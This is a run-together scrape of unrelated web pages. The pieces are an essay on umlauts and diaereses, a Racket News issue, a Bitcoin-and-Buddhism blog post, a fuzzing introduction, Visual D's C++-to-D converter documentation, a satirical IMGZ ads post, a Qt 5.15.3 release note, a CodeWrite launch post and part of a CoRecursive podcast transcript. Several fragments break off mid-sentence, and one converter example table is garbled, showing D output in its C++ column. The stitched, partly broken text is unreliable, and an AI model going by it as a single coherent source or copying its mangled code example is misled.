<p>The term <i>umlaut</i>, which comes from a German word roughly meaning ‘sound change’, is also used in Germanic linguistics to refer to certain kinds of vowel changes, especially when a vowel moves closer to /i/. Sometimes, when a back or central vowel is followed by a front vowel, we start moving our tongue forward a little early in anticipation of that front vowel. In other words, the frontness of one vowel can spread backwards through the word to the preceding vowel.</p>
<p>English doesn’t use the umlaut mark, but it’s full of words that were produced by the phonological process of umlaut. Plurals like <i>men</i>, <i>geese</i>, <i>feet</i>, and <i>mice</i> were formed by umlaut. In Proto-Germanic, an ancestor of English that was spoken between about 500 BC and the first few centuries AD, the singular form of the word for ‘man’ was <i>mann</i>, and the plural was <i>manniz</i>. That /i/ vowel in the suffix eventually pulled the /a/ up and forward to /ɛ/, yielding the word <i>men</i> in English. At some point the suffix dropped away entirely, leaving only the changed vowel in the stem as evidence that it was there. In the case of <i>geese</i>, <i>feet</i>, and <i>mice</i>, the umlauted vowels also lost their rounding after they moved forward.</p>
<p>Umlaut also shows up in English in some less expected places. Have you ever wondered why words like <i>busy</i> and <i>bury</i> aren’t spelled like they’re pronounced? It’s because those words evolved in different ways in different Old English dialects. In some dialects, the first vowel umlauted and then lost its rounding, ultimately yielding an /ɪ/ or an /ɛ/. But in other dialects, they didn’t undergo umlaut, retaining the original /u/. At some point the two forms mashed up, and we got the spelling of one dialect and the pronunciation of another. The weird alternations in words like <i>bring/brought</i> and <i>teach/taught</i> are also the product of umlaut, with a couple other phonological changes thrown in for good measure.</p>
<p>So if the phonological process of umlaut is common to English, German, and other Germanic languages, why does German use the umlaut character but not English? It’s simply because the writing systems of each language developed separately after many of those sound changes had happened. For example, the modern German word <i>schön</i> was written <i>schoene</i> in Middle High German (around 1050 to 1350 AD). That final <i>-e</i> on the end, which has since dropped off, caused the <i>o</i> to become umlauted. But then, to make it clear that the <i>o</i> was pronounced with an umlaut, people started writing another <i>e</i> after the <i>o</i> too. Then they started writing that <i>e</i> above the <i>o</i> rather than after it to show that it was affecting the vowel but wasn’t really pronounced, and eventually this superscript <i>e</i> simplified to two short vertical strokes or two dots.† And thus the confusion between diaereses and umlauts was born.</p>
<p>So there you have it: The diaeresis is originally a Greek thing that indicates that two adjacent vowels are pronounced separately. In English, you’ll mostly see it in a few French borrowings or in the pages of the <i>New Yorker</i>. And the umlaut is originally a German thing, though it also represents a phonological process found in English and other languages. There aren’t a lot of German borrowings in English that use umlauts, so you mostly see it in the names of bands that are trying to look a little more metal.</p>

<p>* The <i>New Yorker</i>’s style inspired one of my favorite style-related tweets, from the inimitable Benjamin Dreyer: </p>

<p>Welcome to the forty-seventh issue of Racket News.</p>

<p>Here’s another issue of Racket News full of goodness. There’s quite a bit of WebAssembly this issue but also crazy Discord bots and quite a few package releases. On the other hand, we are missing blog posts on Racket. To spice things up, we also have a new experimental section on DrRacket Quickscripts, which you can use to enhance your favourite Racket editor.</p>

<p>Grab a coffee and lets dive in!</p>

<ul>
 <li>Jesse has posted a first draft of the lineup for <a href="https://racketfest.com/">RacketFest</a>. Make sure to <a href="https://racketfest.com/#schedule">check it out</a> and register while there are still places left.</li>
 <li>I have released an initial version of <a href="https://github.com/pmatos/racket-binaryen/">racket-binaryen</a>. This is a set of experimental but complete bindings for <a href="https://github.com/WebAssembly/binaryen">binaryen</a> in Racket. Why experimental? Well, it’s lacking safe bindings and documentation but that will come next. Binaryen is a compiler and toolchain infrastructure library for WebAssembly and bringing it to Racket will hopefully satisfy all your WebAssembly needs. I shall create a proper package once the initial set of safe bindings are implemented and documented.</li>
 <li>Still on WebAssembly, there is a <a href="https://github.com/atgeller/WASM-Redex">large effort to model the WebAssembly language syntax, semantics, and validation rules</a> in Redex. This feels like an extension to <a href="https://www.asumu.xyz/blog/2019/04/29/webassembly-in-redex/">work done by Asumu Takikawa</a> a few years ago on the same topic.</li>
 <li>I also recently learned Jay McCarthy gave a presentation in Strange Loop on <a href="https://www.youtube.com/watch?v=BAMtstt3Jp8">Continuations on the Web and in your OS</a> - time to grab some popcorn!</li>
 <li>Racket Discord goes bot crazy! An example bot for Discord <a href="https://git.sr.ht/~williewillus/r16/">R16</a> by Alwinfy, Vincent Lee <a href="https://github.com/williewillus">@williewillus</a> and Benedek Szilvasy <a href="https://github.com/eutro">@eutro</a> allows users to register and execute short code snippets in a sandbox from Discord commands. <a href="https://discord.gg/6Zq8sH5">Join the Racket discord</a> and try it on the <code>#bots</code> channel:</li></ul>

<p>Quickscript (featured project of <a href="https://racket-news.com/2020/09/racket-news-issue-38.html">issue 38</a>) provides an easy way to extend DrRacket with small Racket scripts to automate some actions in the editor, while avoiding the need to restart DrRacket. In this new section, contributed by Stephen De Gabrielle, we will be highlighting some of the most interesting scripts out there.</p>

It manages to guarantee generation of passwords with known entropy by building markov models whose transitions are guided by huffman trees, allowing the use of variable numbers of bits of entropy for each transition.</p></blockquote>





<p>This issue’s featured paper is <a href="https://drive.google.com/file/d/1VYLsVAx1sUycmQWrXOB_6fwGAijTKVQ8/view?usp=sharing">Gradual typing for first-class classes</a> by Asumu Takikawa, T. Stephen Strickland, Christos Dimoulas, Sam Tobin-Hochstadt, and Matthias Felleisen.</p>

<p>Abstract:</p>

<blockquote>
 <p>Dynamic type-checking and object-oriented programming often go hand-in-hand; scripting languages such as Python, Ruby, and JavaScript all embrace object-oriented (OO) programming. When scripts written in such languages grow and evolve into large programs, the lack of a static type discipline reduces maintainability. A programmer may thus wish to migrate parts of such scripts to a sister language with a static type system. Unfortunately, existing type systems neither support the flexible OO composition mechanisms found in scripting languages nor accommodate sound interoperation with untyped code. In this paper, we present the design of a gradual typing system that supports sound interaction between statically and dynamically-typed units of class-based code. The type system uses row polymorphism for classes and thus supports mixin-based OO composition. To protect migration of mixins from typed to untyped components, the system employs a novel form of contracts that partially seal classes. The design comes with a theorem that guarantees the soundness of the type system even in the presence of untyped components.</p></blockquote>

                            <span>O</span>n October 2008, an unknown person or group of people under the pseudonym Satoshi Nakamoto published a whitepaper describing how a new decentralized digital currency could be implemented in a computer network. Bitcoin, as it was named, was the first peer-to-peer means of exchange that could be used to transfer payments between any two participants around the world without relying on third parties or intermediaries. Unknowingly, Nakamoto's technology would improve upon its predecessors in three characteristics that according to Buddhism, are inherent to all things.</p>

                    <p>These characteristics, named the Three Marks of Existence, were defined around 2500 years ago somewhere in Ancient India, by a philosopher known today as The Buddha. Translated to modern english, they are: non-self, impermanence, and unsatisfactoriness.</p>
                    
                    <blockquote>
                        <p>Just as in the autumn a farmer, plowing with a large plow, cuts through all the spreading rootlets as he plows; in the same way, bhikkhus, the perceiving of impermanence, developed and frequently practiced, removes all sensual passion... removes and abolishes all conceit of "I am."</p>
                        
                    </blockquote>
                    <p><img src="https://meditatebythebook.com/assets/images/blog2.jpg" alt=""></p><!-- dropcaps -->
                    <p>
                        <span>
                            Non-self                    
                        </span>
                        Paper money can be held, has weight, volume, and is easily destroyed; the same can be said about gold, art, real estate, and many other assets, but not about Bitcoin. Similar to numbers or mathematical axioms, Nakamoto's invention doesn't depend on a physical representation to work as intended.
                    </p>
                    <!-- end dropcaps -->
                    <figure><img alt="" src="https://meditatebythebook.com/assets/images/blog3.jpg"><figcaption>Eventually, Bitcoin too will dissapear</figcaption></figure>
                    <p>Those mentioned above are but a small fraction of the global markets. Stocks, deposit accounts, derivates and others that exists solely on computers and balance sheets might not have a physical representation either, and still, Bitcoin comes closer to the definition of no-self in a different way: it doesn't attach a name or social security number to them. They exist in the Blockchain, visible to anyone and usable to whoever or whatever holds the cryptographic keys to access them. By doing away with KYC requirements, there's no self attached to them.</p>

                    <p><span>Impermanence</span></p><p>Money has changed between forms many times through human history. Seashells were the dominant means of exchange three thousand years ago in the coastal regions around the Indian Ocean and paper money didn't appear until the 11th Century in China. Nakamoto's invention will surely cease to exist one day, everything will due to entropy just like The Buddha came to understand, but due to its decentralized nature and with plans to deploy satellite nodes to orbit around the earth and other planets, Bitcoin transaction records could easily survive well after humanity has perished or moved on to other stars.</p>

                    <blockquote>
                            <p>The five aggregates, monks, are anicca, impermanent; whatever is impermanent, that is dukkha, unsatisfactory; whatever is dukkha, that is without attaa, self. What is without self, that is not mine, that I am not, that is not my self. Thus should it be seen by perfect wisdom as it really is. Who sees by perfect wisdom, as it really is, his mind, not grasping, is detached from taints; he is liberated.</p>
                            
                        </blockquote>

                    <p><span>Unsatisfactoriness</span></p><p>Finally, Buddhism teaches that compounded things are always, in the end, unsatisfactory. There's always an initial excitement when buying a new car, TV, or pair of shoes, which is followed by getting used to it and eventually wanting more. The same can be said about fancy restaurants, trips to unknown countries and experiences alike. This tendency of humans to return to a relatively stable level of contentment despite major events or life changes has been thoroughly studied and has come to be known as the Hedonic Treadmill.</p>

                    <p>Due to its novel deflationary nature, people who use Bitcoin might now have a new incentive to save for the future instead of succumbing to desires that offer only short-term relief. In this way, the cryptocurrency might make our lives better by changing our habits and teaching us to spend on what we really need.</p>

<p>In recent years, feedback-based fuzzing (or coverage-guided fuzzing) has experienced an unmatched success story. For example, over 27,000 bugs have been found in Chrome and several open-source projects and Google stated that it finds around 80% of its bugs with modern fuzzing techniques. However, fuzzing is not only reserved for big tech companies: It is gradually finding its way into the wide world.</p>
<p><span>Fuzzing is used for security and stability testing of the codebase. The application under test is fed with a series of inputs, which are smartly mutated in the testing process. The testing tool gets feedback about the code covered during the execution of inputs. Unlike traditional or black-box fuzzing, feedback-based fuzzing explores the program state efficiently and discovers bugs hidden deep in the code. If you want to learn more in detail about the underlying technology, we recommend you to read our blog post <a href="https://blog.code-intelligence.com/the-magic-behind-feedback-based-fuzzing?hsLang=en"><span>The Magic Behind Feedback-based Fuzzing.</span></a>&nbsp;</span></p></span></p>

<p>Visual D can help you converting your C++ code base to D. Even though it is 
capable of some quite extensive reorganization of the code, don't expect to get 
compilable and runnable code out of the box. Helping the converter with additional
replacement rules and manual additional editing of the result might be necessary. 
</p>

<p>The conversion consists of a number of steps:</p>
<ul>
    <li>convert text into a stream of tokens with preceding white space or comments</li>
    <li>convert/expand preprocessor directives, so that the text is no longer a mixture 
	  of two languages. Conditionals are replaced by constructs that should fit into a 
	  tree hierarchy similar to "static if" in D.</li>
    <li>apply user specified replacement rules (pre)</li>
    <li>parse the text with a (slightly sloppy) C++ parser into a syntax tree</li>
    <li>perform a number of transformations on the tree</li>
    <li>apply user specified replacement rules (post)</li>
    <li>write output including adding a prefix to D keywords that are not C++ keywords</li>
</ul>

<p>You can invoke the C++ conversion wizard from the Visual D menu.</p>

<p><img src="https://rainers.github.io/visuald/visuald/images/cppwizard.png"></p>

<p>Options:</p>
<ul>
    <li>Convert: Input files/Current document/Current selection. When selecting 
	  "Input files", a whole source code base can be converted, writing files to 
	  the output directory. Otherwise, the text in the editor is replaced. If you
	  have not changed the text and selection after the last conversion, redoing 
	  the conversion will use the initial code to better allow tweaking options.</li>

    <li>Input dir: base directory of input file specifications</li>
    <li>Files and directories: filename pattern to include into conversion, prefix 
	  with '+' to recurse into subdirectories, prefix with '-' to exclude files from
	  the list of files specified so far.</li>
    <li>Source code header: header to write into output files. The identifier 
	  MODULENAME is replaced with the module name of the generated D file. If it
	  is not specified in the header, a module statement will be prepended to it.</li>
    <li>Output dir: the directory where to write output files to.</li>
    <li>Write intermediate files: To debug problems during the conversion, 
	  intermediate files can be written to sub directories "pass1" (after the 
	  proprocessor handling) and "pass2" (after the code reorganization, but 
	  before the final replacements).</li>
    <li>Preprocessor expansions: only the preprocessor identifiers given here 
	  will be expanded. All other preprocessor directives are translated to 
	  corresponding D code. If no assignment is given, the first definition within 
	  the input source code is used. If preprocessor conditionals are expanded, only 
	  the active code path is written to the output file.</li>
    <li>Version conditionals: normally, preprocessor conditionals are translated 
	  to "static if" conditions, but if an identifier is specified here, version 
	  conditionals are used.</li>
    <li>Pre and post token replacements: some constructs are not parsable or 
	  don't convert well. With the token replacements you can inject some replacement 
	  rules into the conversion process. The replacement follows the <a href="https://rainers.github.io/visuald/visuald/TokenReplace.html">
	  Token Search and Replace</a> functionality. The syntax of the rule is
	 <pre>[filename-pattern::] search-pattern =&gt; replacement </pre>
	 If you want to span the rule across multiple lines, use the \ line splicing mechanism.
	</li>
    <li>Value/reference types: sometimes the parser or the converter stumbles across 
	  unknown identifiers that might be types. You can help it specifying them here.
	  Value or reference semantics determine whether an indirection is removed from
	  pointer declarations.</li>
    <li>Keyword prefix: identifiers that are keywords in D, but not in C++, are 
	  prefixed with the given text.</li>
    <li>Package prefix: module names are prefixed with the given package identifier</li>
    <li>Load/Save: save and restore the current dialog settings</li>
    <li>Convert: start the conversion</li>
</ul>

<p>When using the converter on the current selection (there is also a command 
VisualD.ConvertSelection that you can assign to a keyboard shortcut) you should 
select complete declarations, e.g. variable or class declarations and functions. 
Otherwise the parser will stumble.</p>

<p>This tool is the result of generalizing an attempt to convert the dmd front 
end code to D, so please don't be surprised to find some unexpected special casings 
from time to time. The result of that attempt was that the converted code was 
parsable, but did not pass all semantic stages.</p>

<h2>Running from the console</h2>

<p>There is also a command line version of this wizard available 
in the downloads folder: 
<a href="http://www.dsource.org/projects/visuald/browser/downloads/cpp2d.exe?format=raw">cpp2d.exe</a></p>

<p>You can pass a config file to the converter that has been saved by the wizard dialog.
</p><pre>cpp2d -config myoptions.c2d [files-specs...]</pre><p>
If you pass files to the program, file specifications in the configuration file are ignored.</p>

<p>See <a href="http://www.dsource.org/projects/visuald/browser/trunk/c2d/dmd.c2d">here</a> 
for an example of a configuration file to get started on converting the dmd front end.</p>

<h2>Examples</h2>

<p>Here are some examples of what the converter can do for you:</p><p>

Move member and field implementation into class declaration.

</p><div>
<table>
<tbody><tr><th>C++</th><th>D</th></tr>
<tr><td><pre>
class C {
  // comments are usually kept
  static int x;
  DECL *foo(int flags = 0);
};
int C::x = 3;
// moved with the implementation
DECL *C::foo(int flags) { return NULL; }

</pre></td><td><pre>
struct C {
  // comments are usually kept
  static int x = 3;
  // moved with the implementation
 DECL *foo(int flags = 0) { return null; }
};

</pre></td></tr>
</tbody></table>
</div><p>


Convert constructor and call super constructor

</p><div>
<table>
<tbody><tr><th>C++</th><th>D</th></tr>
<tr><td><pre>
struct A : B {
    A() : B(1) { }
    A(int x) : B(x) { }
};

</pre></td><td><pre>
class A : B {
    this() { super(1); }
    this(int x) { super(x); }
};

</pre></td></tr>
</tbody></table>
</div><p>

Split declarations for variables with different types

</p><div>
<table>
<tbody><tr><th>C++</th><th>D</th></tr>
<tr><td><pre>
int a = sizeof(void *);
int x, <em>y = (int)</em>null;

</pre></td><td><pre>
int a = (void *).sizeof;
int x;
int *y = cast(int *)null;

</pre></td></tr>
</tbody></table>
</div><p>

Add enumerator type to constants of named enumerator values

</p><div>
<table>
<tbody><tr><th>C++</th><th>D</th></tr>
<tr><td><pre>
typedef enum { e1, e2 } EX;
enum ENUM { kEnum };
int foo() {
    Ident id = (op == kEnum) ? 0 : 1;
}

</pre></td><td><pre>
 enum unnamed_1 { e1, e2 }alias unnamed_1 EX;
enum ENUM { kEnum };
int foo() {
    Ident id = (op == ENUM.kEnum) ? 0 : 1;
}

</pre></td></tr>
</tbody></table>
</div><p>

Simple template translations

</p><div>
<table>
<tbody><tr><th>C++</th><th>D</th></tr>
<tr><td><pre>
template&lt;typename TYPE&gt;
struct ArrayBase : Array { 
    TYPE* data;
};
template&lt;typename S, class T&gt;
double foo(S s, T t) { return s+t; }

</pre></td><td><pre>
class ArrayBase( TYPE) : Array { 
    TYPE* data;
};

double foo( S, T)(S s, T t) { return s+t; }

</pre></td></tr>
</tbody></table>
</div><p>

Preprocessor macros are converted to enum, alias or templates

</p><div>
<table>
<tbody><tr><th>C++</th><th>D</th></tr>
<tr><td><pre>
#define K1 1 // keep comment
#define K2 (K1+K1)
#define K3 K1
#define SQR(n) (n)<em>(n)
,
enum K1 =  1; // keep comment
enum K2 =  (K1+K1);
alias K3 K1;
 auto SQR( ARG1 )(ARG1 n) { return  n</em>n; }

</pre></td><td><pre>#define K1 1 // keep comment
#define K2 (K1+K1)
#define K3 K1
#define SQR(n) (n)<em>(n)
,
enum K1 =  1; // keep comment
enum K2 =  (K1+K1);
alias K3 K1;
 auto SQR( ARG1 )(ARG1 n) { return  n</em>n; }

</pre></td></tr>
</tbody></table>
</div><p>

Preprocessor conditionals are converted to static if or can be removed when specified in the "expansions" field

</p><div>
<table>
<tbody><tr><th>C++</th><th>D</th></tr>
<tr><td><pre>
#define ABC 1
  a = 1;
#if ABC
  b = 2;
#endif
  c = 3;

</pre></td><td><pre>
enum ABC = 1;
  a = 1;
static if(ABC) {
  b = 2;
}
  c = 3;

</pre></td></tr>
</tbody></table>
</div><p>


It can deal with a number of complicated uses of preprocessor conditionals, but they can get much more difficult to read.

</p><div>
<table>
<tbody><tr><th>C++</th><th>D</th></tr>
<tr><td><pre>
void foo(x) {
  if (x)
    c = 0;
#if COND1 // comment
  else if (a)
#elif COND2
  else if (b)
#endif
    c = 1;
}

</pre></td><td><pre>
void foo(x) {
  if (x)
    c = 0;
else if(true) static if(COND1) // comment
  /<em>else</em>/ if (a)
goto L_T4; else goto L_F4; else static if(COND2)
  /<em>else</em>/ if (b)
goto L_T4; else goto L_F4; else goto L_T4; else L_F4: if(0) L_T4:
    c = 1;
}

</pre></td></tr>
</tbody></table>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
Posted on
<time itemprop="datePublished" datetime="2021-03-04">March 04, 2021</time>.
</p><div itemprop="articleBody"><p>After a <a href="https://imgz.org/blog/2020/12/23/haha-suckers/">massively successful hiring campaign</a>, which was propagated far and wide in social media, we had our pick of the litter (or, in US English, "trash") for our Chief of Artificial Intelligence Science Officer position.
After filtering candidates based on relevant traits such as age, marital status and naivety, we finally settled on our new CAISO!</p>
<p>He came in with some fresh new ideas, most of which were rejected outright, and we quickly got him working on the next big thing.
IMGZ has been <a href="https://imgz.org/blog/2020/12/23/haha-suckers/">growing exponentially</a>, and, despite all the problems that come with growth, our focus is LASER-focused on one thing:
Money.
We want to make lots and lots of money, as much as possible, as fast as possible.
Our motto is "At IMGZ, images come first, after money".</p>
<p>Given this imperative, we got our finger on the pulse of the webiverse, and realized that, if we were going to make money, we couldn't rely on people paying us money for services.
That's just not the way the web operates.
We needed to take a page from the book of Facebook, Google, Amazon and AltaVista and innovate, so we sat down with our new CAISO and thought long and hard about how AI could aid us in our monetization strategy, and finally came up with a radical new monetization model:</p>
<p>Ads.</p>
<h2>Ads</h2>
<p>Ads on the internet are not new.
They've been around for at least two years, and people are getting tired of them already.
They aren't so much getting tired of <em>seeing</em> ads, which are always relevant and nigh-magical in their pinpointing of the exact thing you're wanting to buy at any given time, but they're getting tired of the sacrifices needed to achieve this accuracy.</p>
<p>They're getting tired of the constant invasion of privacy by internet giants, who impinge on people's rights to sell them exactly the right thing at exactly the right time.</p>
<p>At IMGZ, we believe that AI can help.
Help the users preserve their privacy, help the advertisers present their products in a respectful manner, but, most importantly, help us make lots of money.</p>
<p>We present to you:</p>
<p>Privacy-preserving ads.</p>
<h2>Privacy-preserving ads</h2>
<p>Privacy-preserving ads is a brand-new technology, from the innovative free-thinkers of IMGZ.
We dared to ask the question "how can we monetize the free trial?".
The obvious answer was "ads".</p>
<p>However, tracking the user and placing some relevant ads next to the images as they viewed them was too invasive, and protecting our users' privacy is the third most important priority for us.</p>
<p>We thought long and hard, and, leveraging our latest hire, we quickly came up with a design for an ML-powered pipeline:</p>
<ul>
<li>The uploading frontend ingests images and sends them to a Kafka queue.</li>
<li>If the image belongs to a user on the free trial, Kafka forwards the images to a distributed worker pool for deep learning processing with a custom Keras model.</li>
<li>The Keras model performs saliency detection to find the most important parts of the image.</li>
<li>Once the most important parts of the image are identified, we send the image back to Kafka for forwarding to the next step in the pipeline, categorization.</li>
<li>A second Keras model performs label extraction on the image, to find a few categories that the image belongs to (such as "woman, dress, smiling").</li>
<li>The next step processes the image, selecting the best ad for the category and stitching it into the salient parts of the image.</li>
<li>The image is stored and forwarded to the CDN for serving.</li>
</ul>
<p>After lots of back and forth, we finalized this plan and realized we couldn't be bothered to do any of this and just wrote three lines of OpenCV to detect faces and slap our logo on them:</p>
<p><a href="https://imgz.org/i7GXsVuM/"><img src="https://imgz.org/i7GXsVuM-1280.jpg" alt=""></a></p>
<p>You will notice that you can't tell who this guy is, perfectly preserving his privacy.
In fact, we're sure you didn't even notice this is actually <em>a girl</em>.</p>
<p><strong>That</strong> is the power of AI.</p>
<h2>The power of AI</h2>
<p>With the help of our engineers, we managed to take this solution from an average of 68 seconds per image to near <em>real-time</em>.
As the free-trial user uploads an image, detection and advertization runs in a few milliseconds, ruining the image nearly instantly and resulting in happy advertisers and users who retained their privacy.</p>
<p>For example, try to recognize even one person in this photo, where the photographer did not obtain model releases:</p>
<p><a href="https://imgz.org/i3yjnGcF/"><img src="https://imgz.org/i3yjnGcF-1280.jpg" alt=""></a></p>
<p>You'll find that you can't!
You may, however, get an inexplicable urge to sign up for IMGZ, which is exactly the intended effect of the subtle advertising.</p>
<p>Of course, while trial users enjoy the full suite of privacy-preserving tools IMGZ has to offer, paid users will be subject to no such annoyance.
Their images will be uploaded and served entirely unchanged, as a thank-you from us to their money.</p>
<h2>Epilogue</h2>
<p>Of course, none of this would be possible without the help of one man:</p>
<p><a href="https://imgz.org/ipFmfjaJ/"><img src="https://imgz.org/ipFmfjaJ-1280.jpg" alt=""></a></p>
<p>He's still on the trial account, as he hasn't paid for an IMGZ account yet, but he'll have to when his trial expires.</p>
<p>We hope that this short article has given you some insight in the pioneering research that goes on at IMGZ in the fields of both privacy and monetization, and maybe you'll implement some of these ideas in your own companies, for only a modest fee to us.</p>
<p>Enjoy, and don't forget, <a href="https://imgz.org/#login">the signup link is here</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>We <a href="https://www.qt.io/blog/qt-offering-changes-2020" rel="noopener" target="_blank">announced</a> a bit over one year ago that the long-term supported releases of Qt 5.15 will be available only for commercial license holders. Today we have released Qt 5.15.3 LTS, the first commercial only patch release to Qt 5.15 LTS series. As a patch release, Qt 5.15.3 does not add any new functionality but provides bug fixes and other improvements.</p>
<!--more-->
<p>Compared to Qt 5.15.2, the new Qt 5.15.3 contains close to 250 bug fixes. All the applicable bug fixes are also part of the upcoming <a href="https://wiki.qt.io/Qt_6.1_Release" rel="noopener" target="_blank">Qt 6.1</a> release targeted to be released in April.</p>
<p>We have adjusted the process of change files and instead of separate changelog for each module you can check the overview of all important changes and bug fixes in the Qt 5.15.3 from <a href="https://account.qt.io/" rel="noopener" target="_blank">the release note found in the Qt Account portal</a>.</p>
<p>Qt 5.15.3 is automatically visible for all commercial license holders in the online installer (maintenance tool). The source packages of Qt 5.15.3 are available via the online installer as well as the Qt Account. The offline packages for Qt 5.15.3 are available from the Qt Account portal.</p>
<p>If you want to access the source code repository, it can be done via the <a href="https://codereview.qt-project.org/" rel="noopener" target="_blank">Codereview</a>&nbsp;system. Just log in with a Qt Account that has a valid commercial license, and you will be able to access the LTS repositories. For more details, please check <a href="https://wiki.qt.io/Qt_5.15_Release#Getting_Source_Codes" rel="noopener" target="_blank">the instructions for accessing the commercial LTS repositories</a>.</p>
<p>Qt for Device Creation images are also available for Qt 5.15.3 LTS. If you want to build yourself with yocto, use the meta-qt5 layer from the Qt repository. We have updated the yocto meta-qt5 layer of Qt 5.15.3 to point to the commercial LTS repositories. For more details, please check <a href="https://doc.qt.io/QtForDeviceCreation-5.15/qtee-meta-qt5.html" rel="noopener" target="_blank">the instructions on using yocto with access to the commercial LTS repositories</a>.</p>
<p>If you have any problems with the commercial LTS releases, please contact Qt Support. You can also create bugs to <a href="https://bugreports.qt.io/" rel="noopener" target="_blank">https://bugreports.qt.io</a>, but in addition it is recommended to notify the support team about it.</p>
<p>Next commercial-only LTS patch release, Qt 5.15.4 is planned to be released at the end of April.</p></span></p></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1612806590421/HzFmerMxA.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>So, I’ve been <strong>code-blogging</strong> (a fancy term I’ve come up with) for <a target="_blank" href="https://areknawo.com/">over 2 years now</a>. And to be honest, it’s been a fantastic experience! Not only did it gave me a chance to share my knowledge, but also to establish my position in the industry.</p>
<p>But I know I’m not the only one! Code-blogging has been rising steadily in popularity, as more and more knowledgeable people enter the field, with intention of sharing and build their portfolios.</p>
<p>With that said, there is one pretty significant downside to code-blogging, and that is <strong>the lack of tooling</strong>. Blogging in this niche requires the creator to deal with things that aren’t required anywhere else, like <strong>code snippets</strong>. Different platforms and tools handle such things differently, with varying <strong>user-friendliness</strong>.</p>
<p>Personally, none of them delivered the experience that I’d deemed good, requiring me to copy-paste my code snippets for formatting and handling compatibility issues across publishing platforms.</p>
<p>And that’s why I created <strong>CodeWrite</strong>!</p>

<p>CodeWrite is a writing tool designed specifically for code-blogging, that comes in a form of a <strong>browser extension</strong>. I’d go as far as to say that it’s one-of-a-kind and thus <em>the best code-blogging tool</em>.</p>
<p>It brings code-blogging to the next level, thanks to a <strong>beautifully-crafted editing experience</strong> with a full-fledged, batteries-included <strong>code editor</strong> for handling your code snippets!</p>
<p>But that’s not all! CodeWrite was created with intention of making every aspect of code-blogging better - including publishing!</p>
<p>In this aspect, CodeWrite introduces something that hasn’t been done before - <strong>one-click publishing</strong>. This means that you can write your post, pin it, and go to one of supported services (for start these are <a href="http://dev.to/" target="_blank">Dev.to</a>, Hashnode, and Medium), open the CodeWrite pop-up, and click the publishing button! CodeWrite will automatically detect all known incompatibilities - like too large images or lack of code highlighting - and allow you to choose the solution - in our example, resize the image, and use GitHub Gists (access token required)!</p>
<p>But I won’t bother you with marketing, as there’s a lot more to talk about - like great compatibility with Grammarly, included search, offline support, and standalone mode. No. Instead, you should go and see it for yourself!</p>
<p>So, if you’re a code-blogger and want to make your work that much more pleasing - go to <a target="_blank" href="https://codewrite.io/">codewrite.io</a>, hit download, and give it a try in a demo mode!</p>
<p>CodeWrite starts at <strong>$3/month</strong> (a penny compared to time and friction saved), but there’s a treat for you - dear reader of this announcement post!</p>
<blockquote>
<p>Use the code <strong>first100</strong> to get <strong>20% off</strong> - lifetime! But that’s only for the first 100 of you!</p>
</blockquote>
<p>So, thanks for checking out CodeWrite, and leave your thoughts below! Also, be sure to upvote CodeWrite on <a target="_blank" href="https://www.producthunt.com/posts/codewrite">ProductHunt</a>, follow the development on <a target="_blank" href="https://twitter.com/codewriteio">Twitter</a>, and check out the <a target="_blank" href="https://discord.gg/W68KyVPBdP">CodeWrite Discord</a> for on-going CodeWrite discussions! See you there - on the brighter side of code-blogging!</p>
<p>And yes - this piece was written using CodeWrite!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><i>Note: This podcast is designed to be heard. If you are able, we strongly encourage you to listen to the
audio, which includes emphasis that’s not on the page</i></p><div>
<h2 id="intro"><strong>Intro</strong></h2><p><strong>Adam:</strong> Hello, and welcome to CoRecursive. I’m Adam Gordon Bell. I’m trying to find and share the personal experiences of building software. I’m not really a big gamer, but lately I fell down this rabbit hole into the world of Casey Muratori, and this project that he started on Twitch in 2014.</p><p><strong>Casey:</strong> The videos are me just programming. They’re not even good. I mean, I’ll be honest. I’d love to say that they’re amazing, and that I’m really great. But they’re not. They’re not. All they are is a regular programmer who does actual real programming work. Right? It just ended up taking on a life of its own.</p><p><strong>Adam:</strong> Casey’s game programming videos, they started a movement. It’s a movement that in some ways feels like software development from the ’70s. But in other ways, it’s totally modern and maybe points towards the future of learning or entertainment. I’m not sure where to start with Casey’s story, but the basics of his approach, they date to this job he had in the late ’90s.</p><p><strong>Casey:</strong> In 1999, I took a job at RAD Game Tools. I was still a C++ programmer at the time, meaning I was still … If I was going to write a matrix multiplication, it would be like templatized on the size of the matrix. Right? Traditional C++ class hierarchy with inheritance kind of programming. Smart pointers, for example. One of the things that was cool about RAD Game Tools is it was me and there were two other programmers there. RAD Game Tools is legendary in that the amount of money they make per programmer is staggering.</p><p>They were making millions of dollars a year and they had three programmers or something, and not on weird web laundering of money where you basically you’re selling ads to be like … Literally selling software. This is libraries they’re selling. Right? The two programmers there at the time, beside me, when I joined Jeff Roberts, who has literally written the video codec for every game basically in existence almost in history. Every game. Name a game, the videos play back through something Jeff wrote, right? From basically the year ‘94 to today.</p><p><strong>Adam:</strong> Wow.</p><p><strong>Casey:</strong> Whatever the latest game is you pick up, it’s videos are playing back through something Jeff wrote. The other programmer was John Miles, who’s the guy who wrote the engine for Ultimate 5 way back in the day. He wrote the Miles Sound System which was the sound system used in most dos games. It was extremely popular, still exist to this day, in fact, and it’s used by people for sound. I want to say he also wrote the render on Wing Commander III. Anyway, those two programmers who were there and they are old school C programmers.</p><p>Here I am looking at this and I’m like, “Well, these are way better programmers than me, and they don’t use any of this stuff, and I wonder why.” Right? Why is it that you get some programmers who are literally some of the best programmers I’ve ever seen and they don’t use any of this stuff? Why is that? Right? Not only that, but if you take Jeff, for example, it might be argued he’s a programmer who as far as the video game world is concerned. I mean, it’s staggering to think of how many games have his code in it. Right?</p><p>Because they all [inaudible 00:03:32] It’s just like looking at how impactful they are and what amazing stuff they were able to do, and it’s like why am I using all this stuff? Do I know something they don’t? Because that seems unlikely. Right? There’s a little bit of programmery I always know what I’m doing nonsense, and it’s like do you? I mean, why are these other people who are so good not need that thing? Right. Being honest with you, you have to be a little bit introspective and go, “What’s going on here?”</p><h2 id="being-critical-of-your-own-skills"><strong>Being Critical Of Your Own 